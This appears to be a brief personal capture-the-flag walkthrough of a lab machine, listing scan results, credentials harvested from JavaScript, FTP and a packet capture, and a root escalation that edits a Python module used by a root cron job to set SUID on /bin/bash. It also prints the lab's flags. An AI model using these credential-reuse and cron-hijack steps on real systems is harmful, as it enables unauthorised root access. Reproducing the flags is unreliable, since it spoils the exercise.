# ip 
	10.10.170.77
# nmap
	# 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

	# 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	|_http-title: Site doesn't have a title (text/html).
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	# 37370/tcp open  ftp     vsftpd 3.0.3
	Service Info: OS: Unix



# dir
	/gallery/
	/index.html
	/static/
	/pricing

# notes

	in /static/00
		dev notes from valleyDev:
		-add wedding photo examples
		-redo the editing on #4
		-remove /dev1243224123123
		-check for SIEM alervall


in the /dev1243224123123 
	we find login page 
	check the source we find dev.js
		username === "siemDev" && password === "california"
		

		/dev1243224123123/devNotes37370.txt:
			dev notes for ftp server:
			-stop reusing credentials
			-check for any vulnerabilies
			-stay up to date on patching
			-change ftp port to normal port


use the crenditals to ftp in 37370
	
in the siemHTTP2.pcapng in http we find 

uname=valleyDev&psw=ph0t0s1234

lets ssh it 

valleyDev: ph0t0s1234
# shell

valleyAuth..

strings 

e6722920bab2326f8217e4: liberty123


get the valley user

valley: liberty123


we find in crontab the python script run 

we catn edit it but we can got to the base64 script and edit it 
add 

import os
os.system("chmod u+s /bin/bash")

after a minute we see the /bin/bash add our user to the file 
run bash -p

###### we get the root! ###### 




# flags
	user.txt: THM{k@l1_**lley}
	root.txt: THM{v@lley**_pr1v3sc}


















